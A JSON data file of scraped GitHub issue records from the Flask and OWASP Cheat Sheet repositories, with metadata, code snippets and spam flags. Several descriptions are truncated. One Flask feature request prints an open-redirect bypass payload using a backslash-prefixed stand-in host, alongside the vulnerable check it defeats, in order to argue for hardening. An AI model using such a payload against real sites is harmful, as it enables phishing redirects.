@@ -1,0 +1,1539 @@
+[
+  {
+    "repository": "pallets/flask",
+    "issue_number": 5991,
+    "title": "Security: 13 known CVEs in examples/celery/requirements.txt",
+    "description": "## Summary\n\nThe `examples/celery/requirements.txt` file contains pinned dependency versions with **13 known security vulnerabilities** (1 HIGH, 11 MEDIUM, 1 LOW), identified via Trivy filesystem scan.\n\n## Affected File\n\n`examples/celery/requirements.txt` — pip-compiled lockfile for the Celery example application.\n\n## Vulnerabilities\n\n### HIGH (1)\n\n| Package | CVE | Installed | Fixed | Description |\n|---------|-----|-----------|-------|-------------|\n| werkzeug | [CVE-2024-34069](https://avd.aquasec.com/nvd/cve-2024-34069) | 2.3.3 | 3.0.3 | Code execution on developer's machine via debugger |\n\n### MEDIUM (11)\n\n| Package | CVE | Installed | Fixed | Description |\n|---------|-----|-----------|-------|-------------|\n| jinja2 | [CVE-2024-22195](https://avd.aquasec.com/nvd/cve-2024-22195) | 3.1.2 | 3.1.3 | HTML attribute injection via xmlattr |\n| jinja2 | [CVE-2024-34064](https://avd.aquasec.com/nvd/cve-2024-34064) | 3.1.2 | 3.1.4 | Non-attribute character acceptance in keys |\n| jinja2 | [CVE-2024-56201](https://avd.aquasec.com/nvd/cve-2024-56201) | 3.1.2 | 3.1.5 | Sandbox breakout through malicious filenames |\n| jinja2 | [CVE-2024-56326](https://avd.aquasec.com/nvd/cve-2024-56326) | 3.1.2 | 3.1.5 | Sandbox breakout through indirect reference to format method |\n| jinja2 | [CVE-2025-27516](https://avd.aquasec.com/nvd/cve-2025-27516) | 3.1.2 | 3.1.6 | Sandbox breakout through attr filter selecting format method |\n| werkzeug | [CVE-2023-46136](https://avd.aquasec.com/nvd/cve-2023-46136) | 2.3.3 | 2.3.8 | High resource consumption (DoS) |\n| werkzeug | [CVE-2024-49766](https://avd.aquasec.com/nvd/cve-2024-49766) | 2.3.3 | 3.0.6 | safe_join not safe on Windows |\n| werkzeug | [CVE-2024-49767](https://avd.aquasec.com/nvd/cve-2024-49767) | 2.3.3 | 3.0.6 | Resource exhaustion when parsing file data in forms |\n| werkzeug | [CVE-2025-66221](https://avd.aquasec.com/nvd/cve-2025-66221) | 2.3.3 | 3.1.4 | DoS via Windows device names in path segments |\n| werkzeug | [CVE-2026-21860](https://avd.aquasec.com/nvd/cve-2026-21860) | 2.3.3 | 3.1.5 | safe_join() allows Windows special device names with compound extensions |\n| werkzeug | [CVE-2026-27199](https://avd.aquasec.com/nvd/cve-2026-27199) | 2.3.3 | 3.1.6 | safe_join() allows Windows special device names |\n\n### LOW (1)\n\n| Package | CVE | Installed | Fixed | Description |\n|---------|-----|-----------|-------|-------------|\n| flask | [CVE-2026-27205](https://avd.aquasec.com/nvd/cve-2026-27205) | 2.3.2 | 3.1.3 | Information disclosure via improper caching of session data |\n\n## Previous Attempts\n\n- PR #5987 attempted to fix only CVE-2024-34069 (werkzeug) but was closed without merge (2026-04-09). This issue covers all 13 CVEs comprehensively.\n\n## Proposed Fix\n\nUpdate the pinned versions in `examples/celery/requirements.txt`:\n- `flask` 2.3.2 → 3.1.3\n- `werkzeug` 2.3.3 → 3.1.6\n- `jinja2` 3.1.2 → 3.1.6\n- `blinker` 1.6.2 → 1.9.0 (flask 3.x dependency)\n- `itsdangerous` 2.1.2 → 2.2.0 (flask 3.x dependency)\n- `markupsafe` 2.1.2 → ",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-04-10T16:10:05+00:00",
+    "closed_at": "2026-04-10T16:12:27+00:00",
+    "url": "https://github.com/pallets/flask/issues/5991",
+    "language": "Python",
+    "author": "AhsanSheraz",
+    "comments_count": 2,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": true
+  },
+  {
+    "repository": "pallets/flask",
+    "issue_number": 5972,
+    "title": "<spam>",
+    "description": "## Vulnerability Report\n\nHi there! We found 3 known vulnerabilities in this project's dependencies during a routine open-source security scan.\n\n| CVE | Package | Current | Fixed | Severity | CVSS | EPSS |\n|-----|---------|---------|-------|----------|------|------|\n| [CVE-2025-27516](https://nvd.nist.gov/vuln/detail/CVE-2025-27516) | `jinja2` | 3.1.2 | 3.1.6 | HIGH | 8.8 | 0.21% |\n| [CVE-2024-56201](https://nvd.nist.gov/vuln/detail/CVE-2024-56201) | `jinja2` | 3.1.2 | 3.1.5 | HIGH | 8.8 | 0.46% |\n| [CVE-2024-56326](https://nvd.nist.gov/vuln/detail/CVE-2024-56326) | `jinja2` | 3.1.2 | 3.1.5 | HIGH | 7.8 | 0.34% |\n\n<details>\n<summary>Detailed analysis</summary>\n\n### CVE-2025-27516 — `jinja2@3.1.2`\n\n**Jinja2 vulnerable to sandbox breakout through attr filter selecting format method**\n\n> Jinja is an extensible templating engine. Prior to 3.1.6, an oversight in how the Jinja sandboxed environment interacts with the |attr filter allows an attacker that controls the content of a template to execute arbitrary Python code. To exploit the vulnerability, an attacker needs to control the co...\n\n- **Priority:** HIGH\n- **Recommended action:** SCHEDULE PATCH\n- **Reasoning:** CVSS 8.8 indicates high severity with sandbox escape potential allowing arbitrary code execution. However, EPSS 0.00214 shows very low exploitation probability in the wild, and exploitation requires attacker control of template content. Not KEV-listed. The Medium scanner severity appears to underestimate the impact given the 8.8 CVSS score and code execution capability.\n\n### CVE-2024-56201 — `jinja2@3.1.2`\n\n**Jinja has a sandbox breakout through malicious filenames**\n\n> Jinja is an extensible templating engine. In versions on the 3.x branch prior to 3.1.5, a bug in the Jinja compiler allows an attacker that controls both the content and filename of a template to execute arbitrary Python code, regardless of if Jinja's sandbox is used. To exploit the vulnerability, a...\n\n- **Priority:** HIGH\n- **Recommended action:** SCHEDULE PATCH\n- **Reasoning:** CVSS 8.8 indicates high severity with significant impact potential (C:H/I:H/A:H), but exploitation requires specific conditions: attacker control over both template content AND filename. Low EPSS (0.00459) suggests minimal wild exploitation. Not KEV-listed. Scanner severity of LOW appears inaccurate given the CVSS score and potential for arbitrary code execution when conditions are met.\n\n### CVE-2024-56326 — `jinja2@3.1.2`\n\n**Jinja has a sandbox breakout through indirect reference to format method**\n\n> Jinja is an extensible templating engine. Prior to 3.1.5, An oversight in how the Jinja sandboxed environment detects calls to str.format allows an attacker that controls the content of a template to execute arbitrary Python code. To exploit the vulnerability, an attacker needs to control the conten...\n\n- **Priority:** HIGH\n- **Recommended action:** SCHEDULE PATCH\n- **Reasoning:** CVSS 7.8 indicates high impact (C:H/I:H/A:H) but local attack vector a",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-04-04T01:07:05+00:00",
+    "closed_at": "2026-04-04T01:08:06+00:00",
+    "url": "https://github.com/pallets/flask/issues/5972",
+    "language": "Python",
+    "author": "devbrewster",
+    "comments_count": 1,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": true
+  },
+  {
+    "repository": "pallets/flask",
+    "issue_number": 5933,
+    "title": "Add a built-in is_safe_redirect() helper to handle browser URL normalization (backslash → forward slash)",
+    "description": "Modern browsers normalize backslashes in navigation URLs (e.g., `\\\\evil.com`) into forward slashes (`//evil.com`). This creates a discrepancy between how Flask/Werkzeug evaluates redirect targets and how user agents ultimately interpret them.\n\nA common pattern used by Flask developers to prevent protocol-relative redirects is:\n\n```python\nif not url.startswith(\"//\"):\n    return redirect(url)\n```\n\nHowever, the following payload bypasses this logic:\n\n```\n\\\\evil.com\n```\n\nFlask/Werkzeug evaluates this as a safe relative path (`startswith(\"//\") == False`), while browsers normalize it to:\n\n```\nhttps://evil.com\n```\n\nand perform an external redirect. This normalization behavior is consistent across Chrome, Firefox, and Safari.\n\nAs Flask does not provide a built-in redirect validation helper, developers routinely implement ad-hoc string checks that do not account for browser normalization rules, resulting in an ecosystem-wide class of open-redirect flaws.\n\n**Feature Request**\n\nIntroduce an official, browser-aware redirect safety utility in Flask or Werkzeug, similar to Django’s `is_safe_url`, to standardize redirect validation across the framework. The helper should:\n\n1. Normalize backslashes to forward slashes before validation.\n2. Reject protocol-relative URLs (`//example.com`).\n3. Optionally enforce allowed host checks.\n4. Provide a documented, recommended pattern for safe redirects.\n\n**Rationale**\n\n- This issue is not a flaw in Flask’s redirect implementation but a recurring security footgun for developers due to inconsistent handling between application logic and browser URL normalization.\n- Providing an official helper reduces the likelihood of open-redirect vulnerabilities in applications built on Flask.\n- This is framework hardening rather than a security bug report, and it aligns with the expectations set by other frameworks that offer standardized redirect-safety utilities.\n\nThis feature would give developers a reliable and recommended approach to validating redirect targets securely, reducing reliance on fragile custom logic.",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-02-21T15:52:17+00:00",
+    "closed_at": "2026-02-21T17:55:11+00:00",
+    "url": "https://github.com/pallets/flask/issues/5933",
+    "language": "Python",
+    "author": "amadhan882",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "if not url.startswith(\"//\"):\n    return redirect(url)",
+        "language": "python"
+      },
+      {
+        "code": "\\\\evil.com",
+        "language": "unknown"
+      },
+      {
+        "code": "https://evil.com",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "pallets/flask",
+    "issue_number": 5934,
+    "title": "[Security] Default session HMAC digest should be SHA-256, not SHA-1",
+    "description": "## Summary\n\nFlask's `SecureCookieSessionInterface` uses SHA-1 as the default HMAC digest for signing session cookies. SHA-1 has been deprecated by NIST (since 2011) and is no longer recommended for cryptographic use.\n\n## Location\n\n`src/flask/sessions.py`, line 293:\n\n```python\ndigest_method = staticmethod(_lazy_sha1)\n",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-02-21T21:16:02+00:00",
+    "closed_at": "2026-02-21T21:27:24+00:00",
+    "url": "https://github.com/pallets/flask/issues/5934",
+    "language": "Python",
+    "author": "uwezkhan",
+    "comments_count": 0,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 2082,
+    "title": "Update: HTTP_Headers_Cheat_Sheet",
+    "description": "## What is missing or needs to be updated?\nServing user-provided files, such as attachments, without special headers can lead to various security vulnerabilities, including Cross-Site Scripting (XSS) and Content Security Policy (CSP) bypass. This is because browsers execute these files by default. Currently, the cheat sheet only covers the `X-Content-Type-Options` header and partially the `Content-Type` header.\n\n\n## How should this be resolved?\n1. Include the `Content-Disposition` header with a recommendation to use `Content-Disposition: attachment` for serving user-provided files. According to the [RFC](https://httpwg.org/specs/rfc6266.html#rfc.section.4.2), `attachment` should prompt the user to save the response locally, rather than process it normally. Without the header, a browser may default to [`inline` mode](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition#as_a_response_header_for_the_main_body), which typically processes the content.\n2. Suggest using `Content-Type: application/octet-stream` for serving user-provided files. This may prevent a browser from executing a file. According to [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types#applicationoctet-stream):\n> application/octet-stream\n> This is the default for binary files. As it means unknown binary file, browsers usually don't execute it, or even ask if it should be executed. They treat it as if the [Content-Disposition](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition) header was set to attachment, and propose a \"Save As\" dialog.\n> ...\n> Most web servers send unrecognized resources as the application/octet-stream MIME type. For security reasons, most browsers do not allow setting a custom default action (like \"Open in Word\") for such resources, forcing the user to save it to disk to use it.\n\nUsing these headers with `X-Content-Type-Options` should prevent a browser from processing user-provided files.",
+    "labels": [
+      "ACK_OBTAINED",
+      "UPDATE_CS"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-26T14:35:38+00:00",
+    "closed_at": "2026-04-04T17:45:26+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/2082",
+    "language": "Python",
+    "author": "subnix",
+    "comments_count": 9,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 2089,
+    "title": "Update: NPM_Security_Cheat_Sheet - Expand slopsquatting section",
+    "description": "## What is missing or needs to be updated?\n\nThe current cheat sheet mentions slopsquatting briefly in section 10 but does not provide sufficient guidance. Given that AI coding assistants are now widely used by developers, slopsquatting is an increasingly relevant attack vector that deserves more detailed coverage.\n\nSpecifically missing:\n- How slopsquatting differs from typosquatting\n- Why AI tools are particularly vulnerable to hallucinating package names\n- Concrete steps developers can take to verify AI-suggested packages\n- How to configure npm to reduce risk from unverified packages\n\n## How should this be resolved?\n\nExpand the existing slopsquatting subsection in section 10 with more detailed guidance and practical prevention steps for developers using AI coding assistants.",
+    "labels": [
+      "ACK_OBTAINED",
+      "UPDATE_CS"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-29T15:00:44+00:00",
+    "closed_at": "2026-04-04T04:39:13+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/2089",
+    "language": "Python",
+    "author": "niharika2605",
+    "comments_count": 5,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 2000,
+    "title": "New CS proposal: [MCP Security Cheat Sheet]",
+    "description": "## What is the proposed Cheat Sheet about?\nThe sheet sheet will be related to the MCP Security.\n\n## What security issues are commonly encountered related to this area?\nTool Poisoning & Prompt Injectio\nRug Pull Attacks\nConfused Deputy Problems\nOver-Privileged Tool Access\nLocal Sandbox Escapes\nSupply Chain Risks\n\n## What is the objective of the Cheat Sheet?\nProvide actionable, security-first guidance for developers, security engineers, and platform teams using MCP.\n\n## What other resources exist in this area?\n- [MCP Specification — Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)\n- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)\n- [Invariant Labs — Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)\n- [mcp-scan — Security Scanner for MCP Servers](https://github.com/invariantlabs-ai/mcp-scan)\n- [Elastic Security Labs — MCP Attack Vectors & Defense](https://www.elastic.co/security-labs/mcp-tools-attack-defense-recommendations)\n- [Red Hat — MCP Security Risks and Controls](https://www.redhat.com/en/blog/model-context-protocol-mcp-understanding-security-risks-and-controls)\n\n\n",
+    "labels": [
+      "ACK_OBTAINED",
+      "NEW_CS"
+    ],
+    "state": "closed",
+    "created_at": "2026-02-08T15:38:20+00:00",
+    "closed_at": "2026-03-26T10:14:02+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/2000",
+    "language": "Python",
+    "author": "KadirArslan",
+    "comments_count": 32,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 2030,
+    "title": "Update: gRPC_Security_Cheat_Sheet",
+    "description": "<!--- Please complete the sections below -->\n\n## What is missing or needs to be updated?\nThe current cheat sheet covers message size limits for gRPC streams but does not address limiting the number of messages or the total duration of a streaming session.  \nWithout such limits, clients can flood the server or keep streams open indefinitely, potentially causing resource exhaustion.\n\n\n## How should this be resolved?\nAdd a bullet under Input Validation and Data Security → Implement Message Size Limits:\n- Limit streaming sessions and message counts to prevent resource exhaustion. Monitor and enforce maximum messages per stream and maximum session duration.\n\nOptionally, we can include a minimal Go example:\n\n```go\n// Go - Secure streaming with message & duration limits\nfunc (s *server) StreamData(req *pb.StreamRequest, stream pb.MyService_StreamDataServer) error {\n    const maxMessages = 1000          // Max messages per stream\n    const maxDuration = 2 * time.Minute // Max total session time\n\n    start := time.Now()\n    msgCount := 0\n\n    for {\n        if time.Since(start) > maxDuration {\n            return status.Error(codes.ResourceExhausted, \"stream duration exceeded\")\n        }\n\n        if msgCount >= maxMessages {\n            return status.Error(codes.ResourceExhausted, \"maximum messages exceeded\")\n        }\n\n        msg, err := stream.Recv()\n        if err == io.EOF {\n            break\n        }\n        if err != nil {\n            return err\n        }\n\n        // Process message safely\n        processMessage(msg)\n\n        msgCount++\n    }\n\n    return nil\n} \n```\n\n\n<!-- Thank you again for your contribution -->\n",
+    "labels": [
+      "ACK_OBTAINED",
+      "UPDATE_CS",
+      "HELP_WANTED"
+    ],
+    "state": "closed",
+    "created_at": "2026-02-25T22:01:04+00:00",
+    "closed_at": "2026-03-27T17:37:34+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/2030",
+    "language": "Python",
+    "author": "lidiiafedynchuk",
+    "comments_count": 3,
+    "code_snippets": [
+      {
+        "code": "// Go - Secure streaming with message & duration limits\nfunc (s *server) StreamData(req *pb.StreamRequest, stream pb.MyService_StreamDataServer) error {\n    const maxMessages = 1000          // Max messages per stream\n    const maxDuration = 2 * time.Minute // Max total session time\n\n    start := time.Now()\n    msgCount := 0\n\n    for {\n        if time.Since(start) > maxDuration {\n            return status.Error(codes.ResourceExhausted, \"stream duration exceeded\")\n        }\n\n        if msgCount >= maxMessages {\n            return status.Error(codes.ResourceExhausted, \"maximum messages exceeded\")\n        }\n\n        msg, err := stream.Recv()\n        if err == io.EOF {\n            break\n        }\n        if err != nil {\n            return err\n        }\n\n        // Process message safely\n        processMessage(msg)\n\n        msgCount++\n    }\n\n    return nil\n}",
+        "language": "go"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 1741,
+    "title": "New CS proposal: Security Definitions",
+    "description": "I find that even senior developers struggle with some security terminology. Encoding vs escaping vs serialization? Signatures vs encryption? Etc.\n\nI suggest we build a cheatsheet that goes over security terminology that is critical to understanding other projects like the ASVS standard. It assumes developers have a basic security understanding.",
+    "labels": [
+      "ACK_OBTAINED",
+      "NEW_CS",
+      "jules"
+    ],
+    "state": "closed",
+    "created_at": "2025-08-05T11:20:04+00:00",
+    "closed_at": "2026-03-26T10:12:18+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/1741",
+    "language": "Python",
+    "author": "jmanico",
+    "comments_count": 15,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 2063,
+    "title": "New CS proposal: Subdomain Takeover Prevention",
+    "description": "## What is the proposed Cheat Sheet about?\n\nSubdomain takeover prevention — specifically, how developers and DevOps teams can avoid leaving dangling DNS records that allow attackers to claim ownership of their subdomains.\n\nI do pentesting and bug bounty work regularly, and this is honestly one of the most common findings I run into. A company spins up a service on Heroku or S3 or Azure, creates a CNAME for it, then months later the service gets deprovisioned but nobody remembers to clean up the DNS record. An attacker finds it, claims the resource, and now they're serving content on your subdomain. It's embarrassingly easy to exploit and surprisingly hard for organizations to keep track of.\n\n## What security issues are commonly encountered related to this area?\n\nThe core issue is dangling DNS records — CNAMEs (and sometimes A records) pointing to cloud resources that no longer exist. But it branches out into several specific scenarios:\n\n- **Expired cloud resources**: S3 buckets that got deleted, Azure web apps that were removed, GitHub Pages repos that were made private or deleted, Heroku apps that were decommissioned. Each cloud provider has slightly different takeover mechanics.\n- **Forgotten proof-of-concept subdomains**: Dev and staging environments that get set up for a sprint and never torn down.\n- **Third-party SaaS deprovisioning**: Company stops using a service like Fastly, Shopify, or Zendesk but leaves the DNS pointing there.\n- **Impact is worse than people think**: Once someone takes over your subdomain, they can serve phishing pages on your domain, steal cookies scoped to the parent domain, bypass CSP policies that trust *.yourdomain.com, and in some cases compromise OAuth flows that whitelist the subdomain.\n\nOn HackerOne alone there are hundreds of subdomain takeover reports filed every year. It's consistently one of the most reported vulnerability classes in bug bounty programs.\n\n## What is the objective of the Cheat Sheet?\n\nGive engineering teams a practical, actionable guide to prevent subdomain takeovers. Not just \"audit your DNS\" but actually useful stuff:\n\n- Clear explanation of what subdomain takeover is and the real-world impact (cookie theft, phishing on your domain, CSP bypass, etc.)\n- Cloud-specific guidance — what makes AWS S3, Azure, GitHub Pages, Heroku, Fastly, Netlify, etc. vulnerable to takeover, and how to configure each one safely\n- DNS hygiene practices: how to set up processes to catch dangling records before attackers do\n- Detection and monitoring approaches (both DIY and tooling-based)\n- Prevention checklist for DevOps teams — things like \"delete DNS records BEFORE deprovisioning the cloud resource, not after\"\n- How to handle the organizational/process side, because this is fundamentally a problem of teams not communicating during infrastructure changes\n\nI'd be happy to write the initial PR if this proposal gets accepted. I have plenty of real-world notes from testing this stuff.\n\n## What other resources exist",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-03-17T09:36:37+00:00",
+    "closed_at": "2026-03-26T09:35:50+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/2063",
+    "language": "Python",
+    "author": "0xBassia",
+    "comments_count": 3,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 1892,
+    "title": "Update: Table of Contents for CSRF Cheat Sheet",
+    "description": "## What is missing or needs to be updated?\nWith the addition of the Fetch Metadata section, the CSRF Cheat Sheet has become somewhat harder to navigate. Currently, recommended mitigation patterns are mixed in the middle of the table of contents, which may make it less clear for developers to quickly find core recommendations. \n\nThe list in the Introduction section may also need updating to reflect any reordering.\n\nThis was brought up as part of the [Update Fetch Metadata positioning PR](https://github.com/OWASP/CheatSheetSeries/pull/1875), and it was decided to create a separate issue to discuss possible updates.\n\n## How should this be resolved?\nThe structure could look more like this:\n```\n## Disallowing Simple Requests\n## Token-Based Mitigation\n...\n## Fetch Metadata Headers\n## Dealing with Client-Side CSRF Attacks\n## Defense In Depth Techniques\n```\nWe discussed this as a possible high-level structure, but there are definitely other improvements to be made, especially at the subsection level, to improve clarity and prioritisation of the content.\n\n",
+    "labels": [
+      "ACK_OBTAINED",
+      "UPDATE_CS",
+      "HELP_WANTED"
+    ],
+    "state": "closed",
+    "created_at": "2025-11-16T11:48:02+00:00",
+    "closed_at": "2026-03-26T09:25:02+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/1892",
+    "language": "Python",
+    "author": "mkhanas",
+    "comments_count": 14,
+    "code_snippets": [
+      {
+        "code": "## Disallowing Simple Requests\n## Token-Based Mitigation\n...\n## Fetch Metadata Headers\n## Dealing with Client-Side CSRF Attacks\n## Defense In Depth Techniques",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 2077,
+    "title": "New CS proposal: Enterprise Application Security Program Governance",
+    "description": "<!--- Please complete the sections below -->\n\n## What is the proposed Cheat Sheet about?\nThis cheat sheet is about how to build and run an application security program at the enterprise level. Most OWASP resources are written for developers dealing with specific vulnerabilities whereas this one is targeted for the people responsible for the bigger picture like AppSec managers, security leads, and anyone tasked with making application security work consistently across organizations.\nIt covers the practical side of program governance, how to structure your team, how to prioritize and track vulnerabilities at scale, how to integrate security into the development lifecycle without slowing teams down, and how to measure and report on program effectiveness in a way that actually means something to leadership.\nI had reviewed the existing cheat sheet library and there is currently nothing that addresses application security at the program governance level. The closest one's touch on individual practices like threat modeling or dependency management, but none of them look at how to run the program itself. That gap is what this cheat sheet is trying to fill.\n\n## What security issues are commonly encountered related to this area?\nThe security issues in this space are less about individual vulnerabilities and more about the organizational and structural failures that allow vulnerabilities to persist at scale. Some of the most common ones I have seen are listed below:\nNo clear ownership: Security findings get raised but nobody is clearly accountable for fixing them. Teams point fingers at each other and issues stay open indefinitely.\nRisk prioritization done wrong: Organizations either treat every vulnerability as critical and burn out their developers, or they rely solely on CVSS scores which have no context about the actual business impact of a finding.\nSecurity bolted on at the end: Development teams finish building something and security is only involved at the last minute, making it expensive and disruptive to fix anything meaningful.\nNo visibility into the attack surface: Large organizations often do not have a clear picture of all the applications they own, which means unknown and unmanaged risk sitting in forgotten or legacy systems.\nMetrics that do not mean anything: Programs report on number of scans run or tools deployed rather than actual risk reduction, making it impossible to tell whether the program is actually working.\nSecurity champions in name only: Organizations stand up security champion programs but give champions no time, training, or authority to actually drive change in their teams.\nCompliance mistaken for security: Teams focus on passing audits rather than fixing real risk, creating a false sense of security that does not hold up when something goes wrong.\n\n## What is the objective of the Cheat Sheet?\nThe objective is to give AppSec managers and security leaders a practical reference they can actually use when building or improving an",
+    "labels": [
+      "ACK_WAITING",
+      "NEW_CS",
+      "HELP_WANTED"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-25T02:30:57+00:00",
+    "closed_at": "2026-03-25T02:44:26+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/2077",
+    "language": "Python",
+    "author": "balaakasam",
+    "comments_count": 2,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 2048,
+    "title": "Update: Django_Security_Cheat_Sheet",
+    "description": "<!--- Please complete the sections below -->\n\n## What is missing or needs to be updated?\n\nIn the Django Cheat Sheet there is not section on the CSP policies that can be added improve security\n\n\n## How should this be resolved?\n\nAdd a section on CSP policies using Django configuration, my proposal was here : https://github.com/OWASP/CheatSheetSeries/pull/1983/changes\n\n\n\n<!-- Thank you again for your contribution -->\n",
+    "labels": [
+      "ACK_OBTAINED",
+      "UPDATE_CS",
+      "HELP_WANTED"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-03T08:32:07+00:00",
+    "closed_at": "2026-03-24T06:29:14+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/2048",
+    "language": "Python",
+    "author": "Anto59290",
+    "comments_count": 6,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 2013,
+    "title": "Update: Authentication Cheat Sheet – API-based authentication flow reference",
+    "description": "\n## What is missing or needs to be updated?\n\nThe Authentication Cheat Sheet provides detailed guidance on individual mechanisms (sessions, reauthentication, MFA, token handling), but it does not clearly describe *where* authentication and authorization decisions should occur in a modern API-based architecture.\n\nFor developers building API-first systems (e.g., REST APIs, FastAPI/Django APIs, microservices), it is often unclear which responsibilities belong to:\n- login endpoints,\n- middleware,\n- token refresh endpoints,\n- or mid-session risk escalation logic.\n\nThis lack of architectural context can lead to inconsistent or insecure implementations, even when individual recommendations are followed.\n\n## How should this be resolved?\n\nAdd a short, diagram-style documentation subsection to the Authentication Cheat Sheet titled:\n\n**“Where authentication decisions should occur in an API-based system”**\n\nThe subsection would:\n- Describe the request lifecycle in an API-driven architecture\n- Explain the responsibilities of:\n  - Login endpoints\n  - Authentication/authorization middleware\n  - Token refresh endpoints\n  - Mid-session reauthentication or risk escalation\n- Be framework-agnostic and text-based (no images required)\n- Reference existing sections such as Session Management and Reauthentication After Risk Events\n\nThis addition would connect existing guidance into a practical architectural model without changing any existing recommendations.\n\n\n",
+    "labels": [
+      "ACK_WAITING",
+      "UPDATE_CS",
+      "HELP_WANTED"
+    ],
+    "state": "closed",
+    "created_at": "2026-02-17T15:57:25+00:00",
+    "closed_at": "2026-03-15T18:06:34+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/2013",
+    "language": "Python",
+    "author": "Alvi24-hub",
+    "comments_count": 6,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 2011,
+    "title": "[UPDATE] Modernize Python Secrets Retrieval in Serverless Cheat Sheet using AWS Lambda Extension",
+    "description": "### Description\nThe current Python examples in the `Serverless_Security_Cheat_Sheet.md` for secrets management utilize the `boto3` SDK to fetch secrets directly. While functional, this is no longer the recommended best practice for high-performance or cost-efficient serverless applications.\n\n### Proposed Improvement\nI propose updating the \"Secrets Management\" section to demonstrate the use of the **AWS Parameters and Secrets Lambda Extension**. \n\n**Why this is better:**\n1. **Security:** It uses a local HTTP endpoint (`localhost:2773`), minimizing the footprint of the AWS SDK within the function and reducing the risk of logging sensitive credential retrieval attempts.\n2. **Performance:** The extension provides a managed, in-memory cache. This significantly reduces latency (cold starts) and prevents unnecessary API calls to Secrets Manager on every invocation.\n3. **Cost:** It drastically reduces the number of API requests, which are billed at $0.05 per 10,000 calls.\n\n### Changes\nI will replace the existing `boto3` example with a `urllib3` implementation that interacts with the extension's local cache. I will also add a brief technical note regarding the requirement of adding the extension as a Layer.\n\n",
+    "labels": [
+      "ACK_OBTAINED",
+      "UPDATE_CS"
+    ],
+    "state": "closed",
+    "created_at": "2026-02-17T07:08:04+00:00",
+    "closed_at": "2026-03-15T23:00:33+00:00",
+    "url": "https://github.com/OWASP/CheatSheetSeries/issues/2011",
+    "language": "Python",
+    "author": "Angelmendiratta",
+    "comments_count": 3,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "OWASP/CheatSheetSeries",
+    "issue_number": 1558,
+    "title": "Update: CSRF Cheat Sheet",
+    "description": "<!--- Please complete the sections below -->\r\n\r\n## What is missing or needs to be updated?\r\n<!--- Provide a description of the problem with the current Cheat Sheet -->\r\n\r\nThe docs discourage the \"Naive Double-Submit Cookie Pattern\" because it is vulnerable to \"certain attacks\", linking to the [\"Bypassing CSRF Protections\" paper](https://owasp.org/www-chapter-london/assets/slides/David_Johansson-Double_Defeat_of_Double-Submit_Cookie.pdf).\r\n\r\nThat paper describes a class of attacks where an attacker is able to set cookies on the target site, either through a subdomain or a MITM attack. They set the CSRF cookie, then send a request with a token matching that cookie. The server verifies the attacker controlled cookie against the token in the attacker's request, and since they match the CSRF protection is bypassed.\r\n\r\nInstead the docs recommend the \"Signed Double-Submit Cookie\" pattern, where the token is signed with a secret key. But signing alone does nothing to prevent this attack! All it does is add an extra step, where the attacker must first get a valid token by making a request. They then set that token in the cookie. Without signing, they could have set any random value in the cookie and it would have worked.\r\n\r\nFrom what I can tell, signing only helps when it is bound to the session. Then the attacker can't inject a valid CSRF cookie without also injecting a valid session cookie, and they can't do that while keeping the user's existing session. But the docs don't state this as a requirement. They recommend that you 